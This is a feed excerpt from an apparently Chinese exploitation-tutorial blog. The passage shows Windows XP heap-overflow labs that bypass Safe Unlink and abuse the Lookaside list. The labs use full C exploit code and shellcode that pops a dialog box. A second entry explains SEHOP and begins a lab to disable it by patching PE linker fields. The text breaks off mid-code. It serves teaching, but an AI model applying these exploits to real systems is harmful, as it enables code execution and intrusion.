眼熟不？对，这是一个短跳转指令，稍后我们会再次解释如何用短跳指令越过垃圾代码，到达 shellcode。</p></blockquote><p>（ 2）确定[Flink]和[Flink+4]的值。覆盖程序的默认异常处理函数句柄，让[Flink+4]=0x0012FFE4，而[Flink] 对于我们来说没有什么作用，所以随便填充一些内容即可，当然为了防止在某个没有分析到的地方使用这个地址，在这设置为 0x0039068C。</p><p>当 h2 申请空间后就会发生以下事情：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[<span class="number">0x003906B8</span>]=<span class="number">0x003906EB</span></span><br><span class="line">[<span class="number">0x003906B8</span>+<span class="number">4</span>]=<span class="number">0x0012FFE4</span></span><br><span class="line">[<span class="number">0x0012FFE4</span>]= <span class="number">0x003906B8</span></span><br><span class="line">[<span class="number">0x003906EB</span> +<span class="number">4</span>]=<span class="number">0x003906B8</span></span><br></pre></td></tr></table></figure><p>重新布置 shellcode 验证分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖原始 chunk 中的 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x8C\x06\x39\x00\xE4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>编译调试运行，在为 h2分配内存的heapalloc() 中的 0x7C93152F 处，即所有 Flink 和 Blink 调整完成后，观察堆块状态。与我们的分析一致。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702124629054.png" alt="image-20220702124629054"></p><h3 id="布置-shellcode"><a class="markdownIt-Anchor" href="#布置-shellcode"></a> 布置 shellcode</h3><p>将谈对话框的机器码放在 0x003906F3 的位置，即伪造的 Flink 和 Blink 后面，并在前面的 0x90 填充区放置短跳转指令来跳过伪造的 Flink 和 Blink，防止它们对程序执行产生影响。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702125031511.png" alt="image-20220702125031511"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x10\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x06\x39\x00\xEB\x06\x39\x00&quot;</span><span class="comment">//覆盖 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\xEB\x31\x90\x90\x90\x90\x90\x90&quot;</span><span class="comment">//跳转指令，跳过下面的垃圾代码</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x11\x01\x10\x00\x99\x99\x99\x99&quot;</span></span><br><span class="line"><span class="string">&quot;\x8C\x06\x39\x00\xB4\xFF\x12\x00&quot;</span><span class="comment">//伪造的 Flink 和 Blink</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>将程序中的 shellcode 按照上面的布局设置，去掉 INT 3，重新编译程序。弹出异常对话框，直接点击 “调试”，就能看到 failwest 对话框了。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220702131040537.png" alt="image-20220702131040537"></p><h1 id="利用-lookaside-表进行堆溢出"><a class="markdownIt-Anchor" href="#利用-lookaside-表进行堆溢出"></a> 利用 Lookaside 表进行堆溢出</h1><p>Safe Unlink 对空表中双向链表进行了有效性验证，而对于快表中的单链表是没有进行验证的，所以我们可以利用快表进行堆溢出。</p><p>从快表中拆卸结点过程：<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220703071212958.png" alt="image-20220703071212958" style="zoom: 67%;"></p><p>与前面一样，利用链表拆卸过程中的指针伪造思路。</p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220703071428228.png" alt="image-20220703071428228" style="zoom:80%;"><h2 id="实验代码-2"><a class="markdownIt-Anchor" href="#实验代码-2"></a> 实验代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> shellcode []=</span><br><span class="line">    <span class="string">&quot;\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x03\00\x03\x00\x5C\x01\x08\x99&quot;</span><span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\xE4\xFF\x12\x00&quot;</span><span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line">    <span class="comment">//填充</span></span><br><span class="line">    <span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line">    <span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line">    <span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line">    <span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line">    <span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line">    <span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line">    <span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line">    <span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line">    <span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line">    <span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">    ;</span><br><span class="line">    HLOCAL h1,h2,h3;</span><br><span class="line">    HANDLE hp;</span><br><span class="line">    hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    __asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">    h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">    HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">    <span class="built_in">memcpy</span>(h1,shellcode,<span class="number">300</span>);</span><br><span class="line">    h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(h3,<span class="string">&quot;\x90\x1E\x39\x00&quot;</span>,<span class="number">4</span>);</span><br><span class="line">    <span class="type">int</span> zero=<span class="number">0</span>;</span><br><span class="line">    zero=<span class="number">1</span>/zero;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,zero);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="实验思路-2"><a class="markdownIt-Anchor" href="#实验思路-2"></a> 实验思路</h2><p>（1）首先申请 3 块 16 字节的空间，然后将其释放到快表中，以便下次申请空间时可以从快表中分配。<br>（2）通过向 h1 中复制超长字符串来覆盖 h2 块首中下一堆块的指针。<br>（3）用户申请空间时我们伪造的下一堆块地址就会被赋值给 Lookaside[2]-&gt;next，当用户再次申请空间时系统就会将我们伪造的地址作为用户申请空间的起始地址返回给用户。<br>（4）当我们将这个地址设置为异常处理函数指针所在位置时就可以伪造异常处理函数了。<br>（5）通过制造除 0 异常，让程序转入异常处理，进而劫持程序流程，让程序转入 shellcode 执行。</p><table><thead><tr><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows XP Pro SP2</td></tr><tr><td>编译环境</td><td>VC++ 6.0</td></tr><tr><td>build 版本</td><td>release 版本</td></tr></tbody></table><blockquote><p>说明：实验过程中的堆地址等信息在您的实验环境中可能会稍有区别。</p><p>注意：此实验在常态堆下进行，注意不要用调试态。</p></blockquote><p>直接编译运行程序，在弹出的对话框中单击“调试”，进入OD调试。分析程序在执行完两次释放操作后内存状态，记下 h1、 h2 和 h3 的值，这个值大家可以通过每次执行完 HeapAlloc 的 EAX 获得，本次实验中 3 个地址分别为：0x00391E90、 0x00391EA8 和 0x00391EC0。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706090816776.png" alt="image-20220706090816776"></p><p>确定填充字符串的长度和异常处理函数指针所在位置。h1 中数据部分起始地址为 0x00391E90，而 h2 中下一堆块指针位于 0x00391EA8，所以只需要向 h1 中复制超过 28 个字节的字符就可以覆盖掉 h2 中下一堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x03\00\x03\x00\x44\x01\x08\x00&quot;</span> <span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xE4\xFF\x12\x00&quot;</span> <span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>将程序运行到覆盖掉块首后第一次申请空间结束时，然后转到快表索引部分附近（0x00390688）。如下图，Lookaside[2] 中的下一块首地址已经被修改为 0x0012FEE4。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706081836917.png" alt="image-20220706081836917"></p><p>继续单步运行到再次申请空间结束时，通过 EAX 可以看到程序申请到的空间起始地址确实为 0x0012FFE4，如下图所示。<img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706083450264.png" alt="image-20220706083450264"></p><p>只要向这个刚申请的空间里写入 shellcode 的起始地址就能跳转运行 shellcode。为了演示方便，将弹出对话框的机器码放置在 h1 中，这样只需要在 0x0012FFE4 中写入 h1 的起始地址就可以在程序发生异常的时候劫持程序流程了。</p><p>shellcode 的布局<br><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706085438047.png" alt="image-20220706085438047"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> shellcode []=</span><br><span class="line"><span class="string">&quot;\xEB\x40\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x03\00\x03\x00\x44\x01\x08\x00&quot;</span> <span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xE4\xFF\x12\x00&quot;</span> <span class="comment">//用默认异常处理函数指针所在位置覆盖</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">//填充</span></span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91 \x0C&quot;</span></span><br><span class="line"><span class="string">&quot;……&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8&quot;</span></span><br><span class="line">;</span><br></pre></td></tr></table></figure><p>按照上面的 shellcode 布局，去掉 INT 3 指令，重新编译运行。弹出异常对话框，直接单击 ”调试“ 就能看到对话框了。</p><p><img src="/2022/07/06/%E9%87%8D%E9%87%8D%E4%BF%9D%E6%8A%A4%E4%B8%8B%E7%9A%84%E5%A0%86/image-20220706123029305.png" alt="image-20220706123029305"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h1 id=&quot;堆保护机制的原理&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#堆保护机制的原理&quot;&gt;&lt;/a&gt; 堆保护机制的原理&lt;/h1&gt;
&lt;p&gt;堆中的安全校验操作&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;**PEB random：**在 W</summary>
      
    
    
    
    <category term="0day安全" scheme="https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="堆" scheme="https://www.rgzzplus.com/tags/%E5%A0%86/"/>
    
  </entry>
  
  <entry>
    <title>S.E.H 终极防护：SEHOP</title>
    <link href="https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/"/>
    <id>https://www.rgzzplus.com/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/</id>
    <published>2022-06-28T10:03:37.000Z</published>
    <updated>2022-08-01T11:20:08.718Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h1 id="sehop-的原理"><a class="markdownIt-Anchor" href="#sehop-的原理"></a> SEHOP 的原理</h1><p>SEHOP（Structured Exception Handling Overwrite Protection），它在 Windows Server 2008 默认启用，而在 Windows Vista 和 Windows 7 中 SEHOP 默认是关闭的。</p><h2 id="启用-sehop-有以下两种方式"><a class="markdownIt-Anchor" href="#启用-sehop-有以下两种方式"></a> 启用 SEHOP 有以下两种方式：</h2><p>（ 1）下载 <a href="http://go.microsoft.com/?linkid=9646972">http://go.microsoft.com/?linkid=9646972</a> 的补丁，此补丁适用于 Windows 7 和 Windows Vista SP1。<br>（ 2）在注册表中 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\kernel 下面找到 DisableExceptionChainValidation 项， 将该值设置为 0，即可启用 SEHOP。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135200328.png" alt="image-20220628135200328"></p><p>程序中的各 S.E.H 函数是以单链表的形式存放于栈中的，而在这个链表的末端是程序的默认异常处理，它负责处理前面 S.E.H 函数都不能处理的异常。</p><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628135450912.png" alt="image-20220628135450912"></p><p>SEHOP 的核心任务是检查这条 S.E.H 链的完整性，在程序转入异常处理前 SEHOP 会检查 S.E.H 链上最后一个异常处理函数是否为系统固定的终极异常处理函数。如果不是，则不会执行当前异常处理函数。</p><p>其验证代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (process_flags &amp; <span class="number">0x40</span> == <span class="number">0</span>) &#123; <span class="comment">//如果没有 SEH 记录则不进行检测</span></span><br><span class="line">    <span class="keyword">if</span> (record != <span class="number">0xFFFFFFFF</span>) &#123; <span class="comment">//开始检测</span></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (record &lt; stack_bottom || record &gt; stack_top)<span class="comment">// SEH 记录必须位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">char</span>*)record + <span class="keyword">sizeof</span>(EXCEPTION_REGISTRATION) &gt; stack_top)</span><br><span class="line">            <span class="comment">//SEH 记录结构需完全在栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            <span class="keyword">if</span> ((record &amp; <span class="number">3</span>) != <span class="number">0</span>) <span class="comment">//SEH 记录必须 4 字节对齐</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            handler = record-&gt;handler;</span><br><span class="line">            <span class="keyword">if</span> (handler &gt;= stack_bottom &amp;&amp; handler &lt; stack_top)</span><br><span class="line">            <span class="comment">//异常处理函数地址不能位于栈中</span></span><br><span class="line">            <span class="keyword">goto</span> corruption;</span><br><span class="line">            record = record-&gt;next;</span><br><span class="line">            &#125; <span class="keyword">while</span> (record != <span class="number">0xFFFFFFFF</span>); <span class="comment">//遍历 S.E.H 链</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> ((TEB-&gt;word_at_offset_0xFCA &amp; <span class="number">0x200</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (handler != &amp;FinalExceptionHandler)<span class="comment">//核心检测，地球人都知道，不解释了</span></span><br><span class="line">                <span class="keyword">goto</span> corruption;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2022/06/28/S-E-H-%E7%BB%88%E6%9E%81%E9%98%B2%E6%8A%A4%EF%BC%9ASEHOP/image-20220628140148529.png" alt="image-20220628140148529"></p><p>攻击时，将 S.E.H 结构中的异常处理函数地址覆盖为跳板指令地址，跳板指令根据实际情况进行选择。当程序出现异常的时候，系统会从 S.E.H 链中取出异常处理函数来处理异常，异常处理函数的指针已经被覆盖，程序的流程就会被劫持，在经过一系列跳转后转入 shellcode 执行。由于覆盖异常处理函数指针时同时覆盖了指向下一异常处理结构的指针，这样的话 S.E.H 链就会被破坏，从而被 SEHOP 机制检测出。</p><p>SEHOP 检查是在 SafeSEH 的 RtlIsValidHandler 函数校验前进行的，也就是说利用攻击加载模块之外的地址、堆地址和未启用 SafeSEH 模块的方法都行不通了，必须要考虑其他的出路。理论上我们还有三种方法：<br>（ 1）不去攻击 S.E.H，而是攻击函数返回地址或者虚函数等。<br>（ 2）利用未启用 SEHOP 的模块。<br>（ 3）伪造 S.E.H 链</p><h1 id="攻击返回地址"><a class="markdownIt-Anchor" href="#攻击返回地址"></a> 攻击返回地址</h1><p>这种方法需要一定的运气。如果您能够碰到一个程序，他启用了 SEHOP 但是未启用 GS，或者启用了 GS 但是刚好被攻击的函数没有 GS 保护，什么都不要多说了，直接攻击函数返回地址。</p><h2 id="攻击虚函数"><a class="markdownIt-Anchor" href="#攻击虚函数"></a> 攻击虚函数</h2><p>无论 SEHOP 有多么的强大，它保护的也只是 S.E.H，对于 S.E.H 以外的东西是不提供保护的。所以我们依然可以通过攻击虚函数表来劫持程序流程，这个过程不涉及任何异常处理。之前我们做过，在此就不过多介绍了。</p><h1 id="利用未启用-sehop-的模块"><a class="markdownIt-Anchor" href="#利用未启用-sehop-的模块"></a> 利用未启用 SEHOP 的模块</h1><p>在程序的编译属性里没有提供禁用 SEHOP 这个选项，但是出于兼容性的考虑还是对一些程序禁用了 SEHOP，如经过 Armadilo 加壳的软件。</p><p>操作系统会根据 PE 头中 MajorLinkerVersion 和 MinorLinkerVersion 两个选项来判断是否为程序禁用 SEHOP。可以将这两个选项分别设置为 0x53 和 0x52 来模拟经过 Armadilo 加壳的程序，从而达到禁用 SEHOP 的目的。</p><p>禁用 SEHOP 后，还需要搞定 SafeSEH，所以我们在 “利用未启用 SafeSEH 模块” 实验基础上完成演示。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Windows 7</td><td></td></tr><tr><td>EXE 编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>DLL 编译器</td><td>VC++ 6.0</td><td>将 dll 基址设置为 0x11120000</td></tr><tr><td>系统 SEHOP</td><td>启用</td><td></td></tr><tr><td>程序 DEP</td><td>关闭</td><td></td></tr><tr><td>程序 ASLR</td><td>EXE 随意， DLL 禁用</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><h2 id="实验步骤"><a class="markdownIt-Anchor" href="#实验步骤"></a> 实验步骤</h2><h3 id="编译一个不启用-safeseh-的-dll"><a class="markdownIt-Anchor" href="#编译一个不启用-safeseh-的-dll"></a> 编译一个不启用 SafeSEH 的 DLL。</h3><p>我们在《亡羊补牢：SafeSEH》中介绍过，这里就不过多赘述，直接放出源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//SEH_NOSafeSEH_JUMP.DLL</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line">BOOL APIENTRY <span class="title function_">DllMain</span><span class="params">( HANDLE hModule,DWORD ul_reason_for_call, LPVOID lpReserved)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">jump</span><span 